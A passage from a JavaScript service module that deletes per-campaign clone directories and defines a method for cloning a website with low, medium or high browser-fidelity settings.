      const campaignFiles = files.filter(file => file.startsWith(`campaign-${campaignId}-`));

      for (const file of campaignFiles) {
        const filePath = path.join(this.baseCloneDir, file);
    await fs.rm(filePath, { recursive: true, force: true });
      }

      return { success: true, deletedFiles: campaignFiles.length };
    } catch (error) {
      console.error('Error during cleanup:', error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Clones a website with different fidelity levels.
   * @param {string} url - The URL of the website to clone.
   * @param {string} campaignId - The ID of the campaign.
   * @param {'low'|'medium'|'high'} fidelityLevel - The desired fidelity level.
   * @returns {Promise<object>} - The result of the cloning operation.
   */
  async cloneWithFidelityLevel(url, campaignId, fidelityLevel = 'high') {
    const options = {
      low: {
        headless: true,
        timeout: 15000,
        waitUntil: 'domcontentloaded'
      },
      medium: {
        headless: true,
        timeout: 30000,
        waitUntil: 'networkidle2'
      },
      high: {
        headless: false, // Use headless: false for full browser experience
        timeout: 60000,
        waitUntil: 'networkidle0'
      }
    };

    return this.cloneWebsite(url, campaignId, options[fidelityLevel] || options.high);
  }
}

module.exports = new UniversalScrapingService();
